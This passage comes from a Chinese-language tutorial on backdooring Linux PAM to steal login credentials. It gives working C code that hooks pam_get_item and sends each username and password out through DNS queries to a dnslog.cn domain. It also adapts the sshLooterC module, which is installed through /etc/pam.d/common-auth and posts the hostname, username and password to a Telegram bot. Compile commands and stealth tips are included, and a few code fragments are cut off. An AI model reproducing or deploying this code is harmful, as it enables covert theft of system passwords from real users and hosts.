            fp=fopen("qing.txt","a");
            fprintf(fp,"%s::%s\n",name,p);
            fclose(fp);
    }
### DNS exfiltration收集密码
这里还是在 **retval = _unix_verify_password(pamh, name, p, ctrl)**
下改变逻辑，如果需要将凭证带外的话只需要改变记录方式，比如创建socket对象将认证账号密码发送http格式的包到攻击者的服务器上。这里也可以使用dns带外的形式，还是在更改pam_unix_auth.c的基础上加入dns带外的代码。
Silver Moon
dns.c()
**get_dns_servers** 和 **ChangetoDnsNameFormat** 进行指定dns解析和域名格式转换
    void get_dns_servers()
    {
        FILE *fp;
        char line[200] , *p;
        if((fp = fopen("/etc/resolv.conf" , "r")) == NULL)
        {
            printf("Failed opening /etc/resolv.conf file \n");
        }
        while(fgets(line , 200 , fp))
        {
            if(line[0] == '#')
            {
                continue;
            }
            if(strncmp(line , "nameserver" , 10) == 0)
            {
                p = strtok(line , " ");
                p = strtok(NULL , " ");
                //p now is the dns ip :)
                //????
            }
        }
        strcpy(dns_servers[0] , "208.67.222.222");
        strcpy(dns_servers[1] , "208.67.220.220");
    }
    /*
     * This will convert www.google.com to 3www6google3com 
     * got it :)
     * */
    void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
    {
        int lock = 0 , i;
        strcat((char*)host,".");
        for(i = 0 ; i )
    NAME         top
           pam_get_item - getting PAM informations
    SYNOPSIS         top
           #include 
           int pam_get_item(const pam_handle_t *pamh, int item_type,
                            const void **item);
    DESCRIPTION         top
           The pam_get_item function allows applications and PAM service modules
           to access and retrieve PAM informations of item_type. Upon successful
           return, item contains a pointer to the value of the corresponding
           item. Note, this is a pointer to the actual data and should not be
           free()'ed or over-written! The following values are supported for
           item_type:
可以看到pam_get_item 是用来让应用和pam服务模块去获取PAM信息的，查看手册定义发现当 **item_type** 参数为
**PAM_AUTHTOK** 时
使用 **pam_sm_authenticate()** 和 **pam_sm_chauthtok()**
会传递身份令牌(一般是密码)和包含密码，这里传递了 **密码凭据** :
    PAM_AUTHTOK
               The authentication token (often a password). This token should be
               ignored by all module functions besides pam_sm_authenticate(3)
               and pam_sm_chauthtok(3). In the former function it is used to
               pass the most recent authentication token from one stacked module
               to another. In the latter function the token is used for another
               purpose. It contains the currently active authentication token.
手册末尾也说明了获取用户名使用 **pam_get_user()** 、并且当是服务模块的时候才可以读取认证凭据。
    If a service module wishes to obtain the name of the user, it should
           not use this function, but instead perform a call to pam_get_user(3).
           Only a service module is privileged to read the authentication
           tokens, PAM_AUTHTOK and PAM_OLDAUTHTOK.
所以我们劫持 **pam_get_item** 即可收集凭据。
劫持后的 **pam_get_item** 函数， **orig_ftype** 定义为 **dlsym** 返回动态链接库的函数指针即原
**pam_get_item** 函数，调用原函数后在最后发送dns请求:
    typedef int (*orig_ftype) (const pam_handle_t *pamh, int item_type,  const void **item);
    int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
        int retval;
        int pid;
        const char *name;
        orig_ftype orig_pam;
        orig_pam = (orig_ftype)dlsym(RTLD_NEXT, "pam_get_item");
        // Call original function  so we log password
        retval = orig_pam(pamh, item_type, item);
        // Log credential
        if (item_type == PAM_AUTHTOK && retval == PAM_SUCCESS && *item != NULL) {
            unsigned char hostname[256];
            get_dns_servers();
            pam_get_user((pam_handle_t *)pamh, &name, NULL);
            snprintf(hostname, sizeof(hostname), "%s.%s.qing.dnslog.cn", name, *item); // Change it with your domain
            if (fork() == 0) {
                ngethostbyname(hostname, T_A);
            }
        }
        return retval;
    root@qing:~# vim pam_door.c
    root@qing:~# gcc -fPIC -shared pam_door.c -o qing.so
    root@qing:~# ll qing.so
    -rwxr-xr-x 1 root root 17624 Jun 12 08:13 qing.so
这种好处虽然也是用pam做后门但是不用去动认证文件以及每次收集使用dns带外，动静更小隐蔽性更好一些。
使用 **pam_get_item** 获取密码还可以参考这篇:
### sshLooterC
sshLooterC也是用 **pam_get_item** 来获取密码，只不过是改的 **/etc/pam.d/common-auth**
使认证成功时调用恶意的so:
Copy the looter.so to the infected machine on /lib/security, then edit the
/etc/pam.d/common-auth and add the following lines.
    auth optional module.so
    account optional module.so
将密码带外则是用的 **libcurl** 来带外:
    void sendMessage(char (*message)[]) {
      char url[500];
      char data[200];
      //INSERT HERE YOUR BOT KEY
      char token[200] = "BOT TOKEN";
      //INSERT HERE YOUR USER ID
      int user_id = 1111111;
      snprintf(url,600,"https://api.telegram.org/bot%s/sendMessage",token);
      snprintf(data,300,"chat_id=%d&text=%s",user_id,*message);
      CURL *curl;
      curl_global_init(CURL_GLOBAL_ALL);
      curl = curl_easy_init();
      if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS,data); 
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_perform(curl);
      }
      curl_global_cleanup();
    }
使用这个项目时候有点bug，添加下函数声明:
    //添加函数声明
    int pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char
    *prompt);
    PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const
    char **argv ) {
    const char* username = NULL;
    const char* password = NULL;
    const char* prompt = NULL;
    char message[1024];
    char hostname[128];
    retval = pam_get_user(pamh, &username, "Username: ");
    //获得密码
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, prompt);
    if (retval != PAM_SUCCESS) {
    return retval;
    }
    gethostname(hostname, sizeof hostname);
    snprintf(message,2048,"Hostname: %s\nUsername: %s\nPassword:
    %s\n",hostname,username,password);
    sendMessage(&message);
    return PAM_SUCCESS;
    }
最后改下接收地址，make编译替换写入即可。
### END
### Links